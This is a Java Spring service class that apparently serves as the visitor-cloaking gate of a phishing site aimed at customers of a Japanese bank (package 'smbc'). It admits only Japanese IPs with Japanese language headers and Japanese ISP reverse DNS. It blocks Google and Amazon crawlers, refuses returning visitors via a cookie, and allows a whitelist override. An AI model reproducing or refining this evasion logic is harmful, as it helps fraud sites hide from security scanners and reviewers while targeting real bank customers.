package com.kidd.smbc.service;

import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import com.alibaba.fastjson.JSON;
import com.kidd.smbc.Utils.CmdUtils;
import com.kidd.smbc.Utils.IpUtils;
import com.kidd.smbc.task.AsyncTask;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.CollectionUtils;
import org.springframework.util.StringUtils;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.nio.charset.Charset;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.List;

@Service
public class AuthUserService {

    private static String authUa = "ja";

    //private static String ipInterfaceUrl = "https://api.ip.sb/geoip/";
    private static String ipInterfaceUrl = "http://ip-api.com/json/";
    //private static String ipInterfaceUrl = "http://whois.pconline.com.cn/ipJson.jsp?json=true&ip=";

    @Autowired
    private CmdUtils cmdUtils;

    @Autowired
    private AsyncTask asyncTask;

    @Autowired
    private CacheService cacheService;

    public boolean auth(HttpServletRequest request) {

        //ip白名单
        String ip = IpUtils.getIpAddress(request);
        //已经访问过的用户、byebye
        Cookie[] cookies = request.getCookies();
        if (null != cookies) {
            for (Cookie cookie : cookies) {
                if (cookie.getName().equalsIgnoreCase("ip")) {
                    return false;
                }
            }
        }
        //已经验证过的用户
        if (null != cacheService.getCommonCache(ip)) {
            Integer cache = (Integer) cacheService.getCommonCache(ip);
            if (cache == 1) {
                return true;
            } else if (cache == -1) {
                return false;
            }
        }
        boolean authBool = auth2(request);
        List<String> whiteList = getWhiteListIp();
        if (!CollectionUtils.isEmpty(whiteList)) {
            if (whiteList.contains(ip)) {
                return true;
            }
        }
        if (authBool) {
            cacheService.setCommonCache(ip, 1);
        } else {
            cacheService.setCommonCache(ip, -1);
        }
        return authBool;
    }

    public boolean auth2(HttpServletRequest request) {
        String ip = IpUtils.getIpAddress(request);
        String ul = request.getHeader("Accept-Language");
        String ua = request.getHeader("User-Agent");
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String dateTime = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        String ipInfo = "";
        //防止可恨的google爬虫
        try {
            ipInfo= HttpRequest.get(ipInterfaceUrl + ip)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .timeout(20000)//超时，毫秒
                    .execute()
                    .body();
            JSONObject jObj = JSONUtil.parseObj(ipInfo);
            String country = (String) jObj.get("countryCode");
            //2、校验rdns
            String rdnsResult = cmdUtils.queryRdns(ip);
            //asyncTask.asyncWriteAccessLog(request, ip, ipInfo, rdnsResult, dateTime);
            if (!jObj.containsKey("countryCode")) {
                return false;
            }
            if (!StringUtils.isEmpty(ul)&& !ul.toLowerCase().contains(authUa)) {
                return false;
            }
            if (!country.toLowerCase().contains("jp")) {
                return false;
            }
            if (!StringUtils.isEmpty(rdnsResult) && rdnsResult.toLowerCase().contains("name")) {
                if (rdnsResult.toLowerCase().contains("google") || rdnsResult.toLowerCase().contains("amazon")) {
                    return false;
                }
                if (rdnsResult.toLowerCase().contains("ne.jp") || rdnsResult.toLowerCase().contains(".jp") || rdnsResult.toLowerCase().contains("bbtec.net")) {
                    return true;
                }
                return false;
            }
            return false;
        } catch (Exception e) {
            asyncTask.asyncWriteLogStr("auth error:" + e.getMessage() + "\n" +ip + "\n"+ ipInfo + "\n" + ul + "\n" + ua);
            return false;
        }
    }

    public List<String> getWhiteListIp() {
        String whiteIpPath = "/root/whiteIp.txt";
        if (!FileUtil.exist(whiteIpPath)) {
            File white = FileUtil.newFile(whiteIpPath);
            FileUtil.appendString("", white, Charset.defaultCharset());
        }
        List<String> whiteIp = FileUtil.readLines(whiteIpPath, Charset.defaultCharset());
        return whiteIp;
    }
}
